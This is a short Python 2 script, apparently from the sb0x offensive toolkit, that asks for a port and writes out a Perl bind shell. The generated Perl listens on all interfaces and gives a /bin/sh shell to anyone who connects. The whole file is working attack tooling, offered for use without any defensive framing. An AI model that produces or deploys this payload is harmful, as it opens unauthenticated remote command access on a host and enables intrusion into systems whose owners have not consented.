"""
perl_bind_shell.py - perl bind shell 

Copyright (c) 2013-201x sb0x project

See the file LICENSE
"""
import random
import string
import os
import sys


class perl_shell(object):
	"""perl_shell method"""
	
	def __init__(self, perl_code,perl_file):
		
		self.perl_code = perl_code #perl code
		self.perl_file = perl_file
		
	def make_file(self):
		print "[*]perl shell gen by levi0x0"
		self.perl = open(self.perl_file, 'w')
		self.perl.write(self.perl_code)
		self.perl.close()
		print "[+]Done Saved: %s" % (self.perl_file)

if sys.platform == "linux2" or sys.platform == "linux":
	os_slash = "/"
elif sys.platform == "win32" or sys.platform == "win64" or sys.platform == "Windows":
	os_slash = "\\"
else:
	os_slash = "/"

		
def rd(length):
   	return ''.join(random.choice(string.lowercase) for i in range(length))
home = os.getcwd()
perl_file = "%s%soutput%s%s.pl" % (home,os_slash,os_slash,rd(4))
port = int(raw_input("* Port:"))


perl_code = '''
#!/usr/bin/perl
use Socket;
$port = %d;
#open tcp/IPv4 socket
socket (S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));
setsockopt (S, SOL_SOCKET, SO_REUSEADDR,1);
bind (S, sockaddr_in ($port, INADDR_ANY));
listen (S, 50);
while (1){
accept (X, S);
if (!($pid = fork()))
{
if(!defined $pid){exit(0);
}
open STDIN,"<&X";
open STDOUT,">&X";
open STDERR,">&X";
exec("/bin/sh");
close X;}}
''' % (port)

start = perl_shell(perl_code, perl_file)
start.make_file()
raw_input("Press any key to Quit.")
